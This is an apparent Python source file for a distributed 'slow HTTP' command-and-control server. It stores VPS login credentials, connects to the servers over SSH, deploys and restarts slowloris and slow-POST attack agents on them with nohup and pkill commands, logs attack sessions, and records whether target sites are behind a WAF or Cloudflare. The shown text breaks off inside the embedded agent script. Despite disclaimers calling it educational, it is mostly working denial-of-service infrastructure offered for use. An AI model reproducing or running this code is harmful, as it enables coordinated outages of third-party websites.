#!/usr/bin/env python3
"""
Distributed Slow HTTP Testing C2 - Advanced Edition
Author: Security Research Tool
Purpose: Educational and Authorized Penetration Testing Only

⚠️  WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY! ⚠️
Unauthorized use against systems you don't own is ILLEGAL!
"""

import sqlite3
import threading
import json
import time
import os
import sys
import signal
import socket
import random
import string
import subprocess
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import base64
import logging
import hashlib
import re
import ipaddress
import select
import argparse
import urllib.parse
from urllib.parse import urlparse
import ssl
import struct
import queue
import tempfile
import platform
import shutil
import traceback

# Try to import optional dependencies
try:
    from cryptography.fernet import Fernet
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    print("[WARNING] cryptography module not found. Password encryption will be limited.")

try:
    import paramiko
    SSH_AVAILABLE = True
except ImportError:
    SSH_AVAILABLE = False
    print("[WARNING] paramiko module not found. SSH functionality will be limited.")

try:
    import colorama
    from colorama import Fore, Back, Style
    colorama.init(autoreset=True)
    COLOR_AVAILABLE = True
except ImportError:
    COLOR_AVAILABLE = False
    print("[WARNING] colorama module not found. Color output will be disabled.")

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False
    print("[WARNING] psutil module not found. System monitoring will be limited.")

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    print("[WARNING] requests module not found. Some network features will be limited.")

try:
    import dns.resolver
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False
    print("[WARNING] dnspython module not found. DNS features will be limited.")

# Ensure logs directory exists
os.makedirs("logs", exist_ok=True)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(f"logs/slowhttp_c2_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("SlowHTTP-C2")

# Version information
VERSION = "5.0"
BUILD_DATE = "2025-09-27"

class Colors:
    """ANSI color codes for terminal output"""
    if COLOR_AVAILABLE:
        RED = Fore.RED
        GREEN = Fore.GREEN
        YELLOW = Fore.YELLOW
        BLUE = Fore.BLUE
        PURPLE = Fore.MAGENTA
        CYAN = Fore.CYAN
        WHITE = Fore.WHITE
        BOLD = Style.BRIGHT
        DIM = Style.DIM
        RESET = Style.RESET_ALL
    else:
        RED = GREEN = YELLOW = BLUE = PURPLE = CYAN = WHITE = BOLD = DIM = RESET = ""

class SecurityManager:
    """Handles security operations like encryption and validation"""
    
    def __init__(self):
        """Initialize security manager with encryption key"""
        self.key_file = 'key.key'
        
        if CRYPTO_AVAILABLE:
            if os.path.exists(self.key_file):
                try:
                    with open(self.key_file, 'rb') as f:
                        self.key = f.read()
                except Exception as e:
                    logger.error(f"Failed to read key file: {str(e)}")
                    self._generate_new_key()
            else:
                self._generate_new_key()
                
            try:
                self.cipher = Fernet(self.key)
            except Exception as e:
                logger.error(f"Failed to initialize cipher: {str(e)}")
                self.cipher = None
        else:
            self.key = None
            self.cipher = None
            logger.warning("Cryptography module not available. Using fallback encryption.")
    
    def _generate_new_key(self):
        """Generate a new encryption key"""
        try:
            self.key = Fernet.generate_key()
            with open(self.key_file, 'wb') as f:
                f.write(self.key)
            os.chmod(self.key_file, 0o600)  # Secure permissions
            logger.info("Generated new encryption key")
        except Exception as e:
            logger.error(f"Failed to generate new key: {str(e)}")
            self.key = None
    
    def encrypt_password(self, password):
        """Encrypt password with proper error handling"""
        if not password:
            return ""
            
        try:
            if CRYPTO_AVAILABLE and self.cipher:
                return base64.b64encode(self.cipher.encrypt(password.encode())).decode()
            else:
                # Fallback encryption (not secure, but better than plaintext)
                salt = os.urandom(16)
                key = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
                return base64.b64encode(salt + key).decode()
        except Exception as e:
            logger.error(f"Encryption error: {str(e)}")
            # Return a special marker for encryption failure
            return f"ENCRYPTION_FAILED_{int(time.time())}"
    
    def decrypt_password(self, encrypted_password):
        """Decrypt password with comprehensive error handling"""
        if not encrypted_password:
            return ""
            
        if encrypted_password.startswith("ENCRYPTION_FAILED_"):
            logger.error("Attempted to decrypt a failed encryption marker")
            return ""
            
        try:
            if CRYPTO_AVAILABLE and self.cipher:
                return self.cipher.decrypt(base64.b64decode(encrypted_password.encode())).decode()
            else:
                # This is just a placeholder - in reality, you can't decrypt the fallback method
                # It would need to be replaced with a proper implementation
                logger.warning("Attempted to decrypt with fallback method, which is not fully reversible")
                return encrypted_password
        except Exception as e:
            logger.error(f"Decryption error: {str(e)}")
            return ""
    
    def validate_ip(self, ip):
        """Validate IP address format"""
        try:
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            return False
    
    def validate_port(self, port):
        """Validate port number"""
        try:
            port_num = int(port)
            return 1 <= port_num <= 65535
        except ValueError:
            return False
    
    def validate_url(self, url):
        """Validate URL format"""
        try:
            result = urlparse(url)
            return all([result.scheme, result.netloc])
        except:
            return False
    
    def sanitize_input(self, input_str, max_length=None):
        """Sanitize user input to prevent injection attacks"""
        if not input_str:
            return ""
        
        # Remove dangerous characters
        sanitized = re.sub(r'[;\'&quot;\\\]', '', str(input_str))
        
        # Limit length if specified
        if max_length and len(sanitized) > max_length:
            sanitized = sanitized[:max_length]
            
        return sanitized

class DatabaseManager:
    """Manages database operations for the C2 server"""
    
    def __init__(self, db_file='c2_database.db'):
        """Initialize database manager with specified database file"""
        self.db_file = db_file
        self.init_database()
    
    def init_database(self):
        """Initialize database schema with all required tables"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            # VPS nodes table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS vps_nodes (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip_address TEXT NOT NULL UNIQUE,
                    username TEXT NOT NULL,
                    password TEXT NOT NULL,
                    ssh_port INTEGER DEFAULT 22,
                    status TEXT DEFAULT 'offline',
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_seen TIMESTAMP,
                    location TEXT,
                    tags TEXT,
                    system_info TEXT
                )
            ''')
            
            # Attack sessions table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS attack_sessions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_name TEXT NOT NULL,
                    target_url TEXT NOT NULL,
                    target_host TEXT,
                    attack_type TEXT NOT NULL,
                    vps_nodes TEXT,
                    start_time TIMESTAMP,
                    end_time TIMESTAMP,
                    status TEXT DEFAULT 'pending',
                    parameters TEXT,
                    results TEXT,
                    notes TEXT,
                    target_info TEXT
                )
            ''')
            
            # Attack results table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS attack_results (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id INTEGER,
                    vps_ip TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    connections_active INTEGER DEFAULT 0,
                    packets_sent INTEGER DEFAULT 0,
                    bytes_sent INTEGER DEFAULT 0,
                    error_count INTEGER DEFAULT 0,
                    cpu_usage REAL,
                    memory_usage REAL,
                    response_codes TEXT,
                    status TEXT,
                    FOREIGN KEY (session_id) REFERENCES attack_sessions (id)
                )
            ''')
            
            # Target information table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS targets (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    domain TEXT NOT NULL UNIQUE,
                    ip_addresses TEXT,
                    web_server TEXT,
                    waf_detected BOOLEAN DEFAULT 0,
                    waf_type TEXT,
                    cloudflare_protected BOOLEAN DEFAULT 0,
                    open_ports TEXT,
                    dns_records TEXT,
                    ssl_info TEXT,
                    whois_info TEXT,
                    last_scan TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    notes TEXT
                )
            ''')
            
            conn.commit()
            logger.info("Database initialized successfully")
        except sqlite3.Error as e:
            logger.error(f"Database initialization error: {str(e)}")
        finally:
            if conn:
                conn.close()
            self.migrate_database()
    
    def add_vps(self, ip_address, username, encrypted_password, ssh_port=22, location=None, tags=None):
        """Add a new VPS node to the database"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            # Check if VPS already exists
            cursor.execute("SELECT id FROM vps_nodes WHERE ip_address = ?", (ip_address,))
            if cursor.fetchone():
                return None, "VPS with this IP address already exists"
            
            # Prepare tags as JSON
            tags_json = json.dumps(tags) if tags else None
            
            # Insert new VPS
            cursor.execute('''
                INSERT INTO vps_nodes (ip_address, username, password, ssh_port, location, tags)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (ip_address, username, encrypted_password, ssh_port, location, tags_json))
            
            conn.commit()
            vps_id = cursor.lastrowid
            logger.info(f"Added new VPS: {ip_address}")
            return vps_id, "VPS added successfully"
        except sqlite3.Error as e:
            logger.error(f"Error adding VPS: {str(e)}")
            return None, f"Database error: {str(e)}"
        finally:
            if conn:
                conn.close()
    
    def get_vps(self, ip_address):
        """Get VPS details by IP address"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            
            cursor.execute("SELECT * FROM vps_nodes WHERE ip_address = ?", (ip_address,))
            vps = cursor.fetchone()
            
            if vps:
                return dict(vps)
            else:
                return None
        except sqlite3.Error as e:
            logger.error(f"Error getting VPS: {str(e)}")
            return None
        finally:
            if conn:
                conn.close()
    
    def get_all_vps(self):
        """Get all VPS nodes"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            
            cursor.execute("SELECT * FROM vps_nodes ORDER BY id")
            vps_list = [dict(row) for row in cursor.fetchall()]
            
            return vps_list
        except sqlite3.Error as e:
            logger.error(f"Error getting all VPS: {str(e)}")
            return []
        finally:
            if conn:
                conn.close()
    
    def update_vps_status(self, ip_address, status, message=None):
        """Update VPS status and last_seen timestamp"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            # Update status and last_seen
            cursor.execute('''
                UPDATE vps_nodes 
                SET status = ?, last_seen = CURRENT_TIMESTAMP
                WHERE ip_address = ?
            ''', (status, ip_address))
            
            conn.commit()
            return True
        except sqlite3.Error as e:
            logger.error(f"Error updating VPS status: {str(e)}")
            return False
        finally:
            if conn:
                conn.close()
    
    def update_vps_system_info(self, ip_address, system_info):
        """Update VPS system information"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            # Convert system_info dict to JSON
            system_info_json = json.dumps(system_info)
            
            # Update system_info
            cursor.execute('''
                UPDATE vps_nodes 
                SET system_info = ?
                WHERE ip_address = ?
            ''', (system_info_json, ip_address))
            
            conn.commit()
            return True
        except sqlite3.Error as e:
            logger.error(f"Error updating VPS system info: {str(e)}")
            return False
        finally:
            if conn:
                conn.close()
    
    def remove_vps(self, ip_address):
        """Remove a VPS node from the database"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            # Delete VPS
            cursor.execute("DELETE FROM vps_nodes WHERE ip_address = ?", (ip_address,))
            
            conn.commit()
            return True
        except sqlite3.Error as e:
            logger.error(f"Error removing VPS: {str(e)}")
            return False
        finally:
            if conn:
                conn.close()
    
    def create_attack_session(self, session_name, target_url, attack_type, vps_nodes, parameters):
        """Create a new attack session"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            # Parse target URL to get host
            parsed = urlparse(target_url)
            target_host = parsed.netloc or parsed.path.split('/')[0]
            
            # Convert parameters dict to JSON
            parameters_json = json.dumps(parameters)
            
            # Convert VPS nodes list to comma-separated string
            vps_nodes_str = ','.join(vps_nodes)
            
            # Insert new attack session
            cursor.execute('''
                INSERT INTO attack_sessions 
                (session_name, target_url, target_host, attack_type, vps_nodes, parameters, status, start_time)
                VALUES (?, ?, ?, ?, ?, ?, 'running', CURRENT_TIMESTAMP)
            ''', (session_name, target_url, target_host, attack_type, vps_nodes_str, parameters_json))
            
            conn.commit()
            session_id = cursor.lastrowid
            logger.info(f"Created attack session: {session_name} (ID: {session_id})")
            return session_id
        except sqlite3.Error as e:
            logger.error(f"Error creating attack session: {str(e)}")
            return None
        finally:
            if conn:
                conn.close()
    
    def update_attack_status(self, session_id, status, results=None):
        """Update attack session status"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            if status == 'completed' or status == 'failed':
                # Set end time if attack is completed or failed
                cursor.execute('''
                    UPDATE attack_sessions 
                    SET status = ?, end_time = CURRENT_TIMESTAMP, results = ?
                    WHERE id = ?
                ''', (status, results, session_id))
            else:
                # Just update status
                cursor.execute('''
                    UPDATE attack_sessions 
                    SET status = ?
                    WHERE id = ?
                ''', (status, session_id))
            
            conn.commit()
            return True
        except sqlite3.Error as e:
            logger.error(f"Error updating attack status: {str(e)}")
            return False
        finally:
            if conn:
                conn.close()
    
    def add_attack_result(self, session_id, vps_ip, connections_active, packets_sent, bytes_sent, error_count, cpu_usage, memory_usage, response_codes, status):
        """Add attack result data"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            # Convert response_codes dict to JSON
            response_codes_json = json.dumps(response_codes) if response_codes else None
            
            # Insert attack result
            cursor.execute('''
                INSERT INTO attack_results 
                (session_id, vps_ip, connections_active, packets_sent, bytes_sent, error_count, cpu_usage, memory_usage, response_codes, status)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (session_id, vps_ip, connections_active, packets_sent, bytes_sent, error_count, cpu_usage, memory_usage, response_codes_json, status))
            
            conn.commit()
            return True
        except sqlite3.Error as e:
            logger.error(f"Error adding attack result: {str(e)}")
            return False
        finally:
            if conn:
                conn.close()
    
    def migrate_database(self):
        """Tambahkan kolom yang hilang"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            # Cek kolom bytes_sent
            cursor.execute("PRAGMA table_info(attack_results)")
            columns = [col[1] for col in cursor.fetchall()]
            
            if 'bytes_sent' not in columns:
                cursor.execute("ALTER TABLE attack_results ADD COLUMN bytes_sent INTEGER DEFAULT 0")
                conn.commit()
                logger.info("Added missing 'bytes_sent' column")
                
        except sqlite3.Error as e:
            logger.error(f"Migration error: {str(e)}")
        finally:
            if conn:
                conn.close()


    def get_attack_session(self, session_id):
        """Get attack session details by ID"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            
            cursor.execute("SELECT * FROM attack_sessions WHERE id = ?", (session_id,))
            session = cursor.fetchone()
            
            if session:
                return dict(session)
            else:
                return None
        except sqlite3.Error as e:
            logger.error(f"Error getting attack session: {str(e)}")
            return None
        finally:
            if conn:
                conn.close()
    
    def get_attack_sessions(self, limit=None):
        """Get all attack sessions with optional limit"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            
            if limit:
                cursor.execute("SELECT * FROM attack_sessions ORDER BY id DESC LIMIT ?", (limit,))
            else:
                cursor.execute("SELECT * FROM attack_sessions ORDER BY id DESC")
                
            sessions = [dict(row) for row in cursor.fetchall()]
            
            return sessions
        except sqlite3.Error as e:
            logger.error(f"Error getting attack sessions: {str(e)}")
            return []
        finally:
            if conn:
                conn.close()
    
    def get_active_attack_sessions(self):
        """Get all active attack sessions"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            
            cursor.execute("SELECT * FROM attack_sessions WHERE status = 'running' ORDER BY id DESC")
            sessions = [dict(row) for row in cursor.fetchall()]
            
            return sessions
        except sqlite3.Error as e:
            logger.error(f"Error getting active attack sessions: {str(e)}")
            return []
        finally:
            if conn:
                conn.close()
    
    def get_attack_results(self, session_id, limit=None):
        """Get attack results for a session with optional limit"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            
            if limit:
                cursor.execute('''
                    SELECT * FROM attack_results 
                    WHERE session_id = ? 
                    ORDER BY timestamp DESC LIMIT ?
                ''', (session_id, limit))
            else:
                cursor.execute('''
                    SELECT * FROM attack_results 
                    WHERE session_id = ? 
                    ORDER BY timestamp DESC
                ''', (session_id,))
                
            results = [dict(row) for row in cursor.fetchall()]
            
            return results
        except sqlite3.Error as e:
            logger.error(f"Error getting attack results: {str(e)}")
            return []
        finally:
            if conn:
                conn.close()
    
    def add_target_info(self, domain, ip_addresses=None, web_server=None, waf_detected=False, waf_type=None, cloudflare_protected=False, open_ports=None, dns_records=None, ssl_info=None, whois_info=None, notes=None):
        """Add or update target information"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            # Convert data to JSON
            ip_addresses_json = json.dumps(ip_addresses) if ip_addresses else None
            open_ports_json = json.dumps(open_ports) if open_ports else None
            dns_records_json = json.dumps(dns_records) if dns_records else None
            ssl_info_json = json.dumps(ssl_info) if ssl_info else None
            whois_info_json = json.dumps(whois_info) if whois_info else None
            
            # Check if target already exists
            cursor.execute("SELECT id FROM targets WHERE domain = ?", (domain,))
            existing = cursor.fetchone()
            
            if existing:
                # Update existing target
                cursor.execute('''
                    UPDATE targets 
                    SET ip_addresses = ?, web_server = ?, waf_detected = ?, waf_type = ?,
                        cloudflare_protected = ?, open_ports = ?, dns_records = ?,
                        ssl_info = ?, whois_info = ?, last_scan = CURRENT_TIMESTAMP,
                        notes = ?
                    WHERE domain = ?
                ''', (ip_addresses_json, web_server, waf_detected, waf_type, cloudflare_protected, open_ports_json, dns_records_json, ssl_info_json, whois_info_json, notes, domain))
                
                target_id = existing[0]
                logger.info(f"Updated target information: {domain}")
            else:
                # Insert new target
                cursor.execute('''
                    INSERT INTO targets 
                    (domain, ip_addresses, web_server, waf_detected, waf_type, cloudflare_protected, open_ports, dns_records, ssl_info, whois_info, notes)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', (domain, ip_addresses_json, web_server, waf_detected, waf_type, cloudflare_protected, open_ports_json, dns_records_json, ssl_info_json, whois_info_json, notes))
                
                target_id = cursor.lastrowid
                logger.info(f"Added new target: {domain}")
            
            conn.commit()
            return target_id
        except sqlite3.Error as e:
            logger.error(f"Error adding target info: {str(e)}")
            return None
        finally:
            if conn:
                conn.close()
    
    def get_target_info(self, domain):
        """Get target information by domain"""
        conn = None
        try:
            conn = sqlite3.connect(self.db_file)
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            
            cursor.execute("SELECT * FROM targets WHERE domain = ?", (domain,))
            target = cursor.fetchone()
            
            if target:
                target_dict = dict(target)
                
                # Parse JSON fields
                for field in ['ip_addresses', 'open_ports', 'dns_records', 'ssl_info', 'whois_info']:
                    if target_dict.get(field):
                        try:
                            target_dict[field] = json.loads(target_dict[field])
                        except:
                            target_dict[field] = None
                
                return target_dict
            else:
                return None
        except sqlite3.Error as e:
            logger.error(f"Error getting target info: {str(e)}")
            return None
        finally:
            if conn:
                conn.close()
    
    def close(self):
        """Close any open database connections"""
        # SQLite connections are opened and closed for each operation
        # This method is included for consistency with other managers
        pass

class SSHManager:
    """Manages SSH connections to VPS nodes"""
    
    def __init__(self, security_manager):
        """Initialize SSH manager with security manager for password handling"""
        self.connections = {}
        self.security_manager = security_manager
        self.connection_cache = {}  # Cache VPS credentials for auto-reconnect
    
    def connect_vps(self, ip, username, encrypted_password, port=22, timeout=15):
        """Connect to a VPS with comprehensive error handling"""
        if not SSH_AVAILABLE:
            return False, "SSH functionality not available (paramiko not installed)"
            
        try:
            password = self.security_manager.decrypt_password(encrypted_password)
            
            # Cache credentials for auto-reconnect
            self.connection_cache[ip] = {
                'username': username,
                'encrypted_password': encrypted_password,
                'port': port
            }
            
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Try to connect with timeout
            ssh.connect(
                hostname=ip,
                username=username,
                password=password,
                port=port,
                timeout=timeout
            )
            
            self.connections[ip] = ssh
            return True, "Connected successfully"
            
        except paramiko.AuthenticationException:
            return False, "Authentication failed - check username and password"
        except paramiko.SSHException as e:
            return False, f"SSH error: {str(e)}"
        except socket.timeout:
            return False, "Connection timed out"
        except socket.error as e:
            return False, f"Socket error: {str(e)}"
        except Exception as e:
            return False, str(e)
    
    def reconnect_vps(self, ip):
        """Attempt to reconnect to VPS using cached credentials"""
        if ip not in self.connection_cache:
            return False, "No cached credentials for this VPS"
        
        cached = self.connection_cache[ip]
        return self.connect_vps(
            ip, 
            cached['username'], 
            cached['encrypted_password'], 
            cached['port']
        )
    
    def disconnect_vps(self, ip):
        """Disconnect from a VPS"""
        if ip in self.connections:
            try:
                self.connections[ip].close()
                del self.connections[ip]
                return True
            except Exception as e:
                logger.error(f"Error disconnecting from {ip}: {str(e)}")
        return False
    
    def execute_command(self, ip, command, timeout=60, auto_reconnect=True, max_retries=3):
        """Execute command with enhanced error handling and recovery"""
        
        retries = 0
        last_error = None
        
        while retries < max_retries:
            # Check if connection exists
            if ip not in self.connections:
                if auto_reconnect:
                    logger.info(f"No connection to {ip}, attempting reconnect...")
                    success, message = self.reconnect_vps(ip)
                    if not success:
                        last_error = f"Reconnection failed: {message}"
                        retries += 1
                        time.sleep(2 ** retries)  # Exponential backoff
                        continue
                else:
                    return False, "No connection to VPS"
            
            try:
                stdin, stdout, stderr = self.connections[ip].exec_command(command, timeout=timeout)
                exit_status = stdout.channel.recv_exit_status()
                output = stdout.read().decode('utf-8', errors='replace')
                error = stderr.read().decode('utf-8', errors='replace')
                
                # Handle specific error cases
                if exit_status != 0:
                    # Check for database-related errors
                    if "no column named bytes_sent" in error or "table attack_results has no column" in error:
                        logger.error(f"Database schema error on {ip}: {error}")
                        logger.info("Attempting to fix database schema...")
                        
                        # Try to fix database schema
                        if self._fix_database_schema(ip):
                            logger.info("Database schema fixed, retrying command...")
                            retries += 1
                            continue
                        else:
                            logger.error("Failed to fix database schema")
                    
                    # Log detailed error
                    logger.error(f"Command failed on {ip}:")
                    logger.error(f"Command: {command[:100]}...")  # Log partial command
                    logger.error(f"Exit status: {exit_status}")
                    logger.error(f"Error: {error}")
                    
                    # Try to restart attack if it's an attack command
                    if "attack" in command.lower() and auto_reconnect:
                        logger.info(f"Attempting to restart attack on {ip}")
                        if self.restart_attack(ip):
                            logger.info("Attack restarted successfully")
                            retries += 1
                            continue
                    
                    last_error = error or "Command failed with no error message"
                    retries += 1
                    time.sleep(2 ** retries)
                    continue
                
                return True, output
                
            except socket.timeout:
                logger.error(f"Command timed out on {ip}")
                last_error = "Command timed out"
                retries += 1
                time.sleep(2 ** retries)
                
            except paramiko.SSHException as e:
                logger.error(f"SSH error on {ip}: {str(e)}")
                
                # Try to reconnect if connection was lost
                if auto_reconnect:
                    logger.info(f"Attempting to reconnect to {ip}...")
                    success, message = self.reconnect_vps(ip)
                    if success:
                        logger.info(f"Reconnected to {ip}, retrying command...")
                        retries += 1
                        continue
                    else:
                        last_error = f"Reconnection failed: {message}"
                
                retries += 1
                time.sleep(2 ** retries)
                
            except Exception as e:
                logger.error(f"Unexpected error executing command on {ip}: {str(e)}")
                last_error = str(e)
                retries += 1
                time.sleep(2 ** retries)
        
        return False, f"Command failed after {max_retries} retries. Last error: {last_error}"
    

    def restart_attack(self, ip):
        """Restart attack process on VPS"""
        try:
            # Kill existing attack process
            kill_cmd = "pkill -f 'python3 agent.py'"
            success, output = self.execute_command(ip, kill_cmd, auto_reconnect=False)
            
            # Start new attack process
            if ip in self.connection_cache:
                cached = self.connection_cache[ip]
                attack_cmd = f"cd ~/slowhttp_agent && nohup python3 agent.py --target {cached.get('target', '')} --port {cached.get('port', 80)} > /dev/null 2>&1 &"
                success, output = self.execute_command(ip, attack_cmd, auto_reconnect=False)
                
                if success:
                    logger.info(f"Successfully restarted attack on {ip}")
                    return True
                else:
                    logger.error(f"Failed to restart attack on {ip}: {output}")
                    return False
            else:
                logger.error(f"No cached data for {ip}")
                return False
                
        except Exception as e:
            logger.error(f"Failed to restart attack on {ip}: {str(e)}")
            return False
    
    def _fix_database_schema(self, ip):
        """Attempt to fix database schema on VPS"""
        try:
            # Check if database file exists
            check_db_cmd = "test -f c2_database.db && echo 'exists' || echo 'missing'"
            success, output = self.execute_command(ip, check_db_cmd, auto_reconnect=False)
            if not success or "missing" in output:
                logger.warning("Database file not found on VPS")
                return False
            
            # Get database schema
            schema_cmd = "sqlite3 c2_database.db \"PRAGMA table_info(attack_results)\""
            success, output = self.execute_command(ip, schema_cmd, auto_reconnect=False)
            if not success:
                logger.error("Failed to get database schema")
                return False
            
            # Check if bytes_sent column exists
            if "bytes_sent" not in output:
                # Add missing column
                alter_cmd = "sqlite3 c2_database.db \"ALTER TABLE attack_results ADD COLUMN bytes_sent INTEGER DEFAULT 0\""
                success, output = self.execute_command(ip, alter_cmd, auto_reconnect=False)
                if success:
                    logger.info("Successfully added bytes_sent column to database")
                    return True
                else:
                    logger.error("Failed to add bytes_sent column")
                    return False
            else:
                logger.info("Database schema already up to date")
                return True
                
        except Exception as e:
            logger.error(f"Error fixing database schema: {str(e)}")
            return False
    
    def deploy_agent(self, ip, agent_type="standard"):
        """Deploy attack agent to VPS"""
        if ip not in self.connections:
            return False, "No connection to VPS"
        
        try:
            # Create directory for agent
            mkdir_cmd = "mkdir -p ~/slowhttp_agent"
            success, output = self.execute_command(ip, mkdir_cmd)
            if not success:
                return False, f"Failed to create agent directory: {output}"
            
            # Get appropriate agent script
            if agent_type == "advanced":
                agent_script = self._get_advanced_agent_script()
            else:
                agent_script = self._get_standard_agent_script()
            
            # Write script to file
            write_cmd = f"cat > ~/slowhttp_agent/agent.py << 'EOL'\n{agent_script}\nEOL"
            success, output = self.execute_command(ip, write_cmd)
            if not success:
                return False, f"Failed to write agent script: {output}"
            
            # Make script executable
            chmod_cmd = "chmod +x ~/slowhttp_agent/agent.py"
            success, output = self.execute_command(ip, chmod_cmd)
            if not success:
                return False, f"Failed to make agent executable: {output}"
            
            # Test agent
            test_cmd = "cd ~/slowhttp_agent && python3 agent.py --version"
            success, output = self.execute_command(ip, test_cmd)
            if not success:
                return False, f"Agent test failed: {output}"
            
            logger.info(f"Successfully deployed {agent_type} agent to {ip}")
            return True, "Agent deployed successfully"
        except Exception as e:
            logger.error(f"Error deploying agent to {ip}: {str(e)}")
            return False, str(e)
    
    def get_system_info(self, ip):
        """Get system information from VPS"""
        if ip not in self.connections:
            return None
        
        try:
            # Create a command to gather system information
            cmd = """
            echo "{"
            echo "  \&quot;hostname\&quot;: \&quot;$(hostname)\&quot;,"
            echo "  \&quot;os\&quot;: \&quot;$(cat /etc/os-release | grep PRETTY_NAME | cut -d '=' -f 2 | tr -d '\&quot;')\&quot;,"
            echo "  \&quot;kernel\&quot;: \&quot;$(uname -r)\&quot;,"
            echo "  \&quot;cpu\&quot;: \&quot;$(grep 'model name' /proc/cpuinfo | head -1 | cut -d ':' -f 2 | xargs)\&quot;,"
            echo "  \&quot;cpu_cores\&quot;: $(grep -c processor /proc/cpuinfo),"
            echo "  \&quot;memory_total\&quot;: \&quot;$(free -h | grep Mem | awk '{print $2}')\&quot;,"
            echo "  \&quot;memory_used\&quot;: \&quot;$(free -h | grep Mem | awk '{print $3}')\&quot;,"
            echo "  \&quot;disk_total\&quot;: \&quot;$(df -h / | tail -1 | awk '{print $2}')\&quot;,"
            echo "  \&quot;disk_used\&quot;: \&quot;$(df -h / | tail -1 | awk '{print $3}')\&quot;,"
            echo "  \&quot;python_version\&quot;: \&quot;$(python3 --version 2>&1)\&quot;,"
            echo "  \&quot;uptime\&quot;: \&quot;$(uptime -p)\&quot;"
            echo "}"
            """
            
            success, output = self.execute_command(ip, cmd)
            if not success:
                return None
            
            # Parse JSON output
            try:
                system_info = json.loads(output)
                return system_info
            except json.JSONDecodeError:
                logger.error(f"Failed to parse system info from {ip}: {output}")
                return None
        except Exception as e:
            logger.error(f"Error getting system info from {ip}: {str(e)}")
            return None
    
    def get_connection_status(self, ip):
        """Check if connection to VPS is active"""
        return ip in self.connections
    
    def _get_standard_agent_script(self):
        """Get the standard agent script for slowloris and slow POST attacks"""
        return '''#!/usr/bin/env python3
"""
SlowHTTP Attack Agent - Standard Edition
For educational and authorized testing purposes only
"""

import socket
import random
import time
import sys
import argparse
import ssl
import os
import signal
import threading
import json
from urllib.parse import urlparse

VERSION = "3.0"

class SlowHTTPAttacker:
    def __init__(self, target, port=80, use_ssl=False, user_agent=None, path="/"):
        self.target = target
        self.port = port
        self.use_ssl = use_ssl
        self.path = path
        self.running = False
        self.connections = []
        self.lock = threading.Lock()
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        # Generate random user agent if not provided
        if not user_agent:
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:90.0) Gecko/20100101 Firefox/90.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
            ]
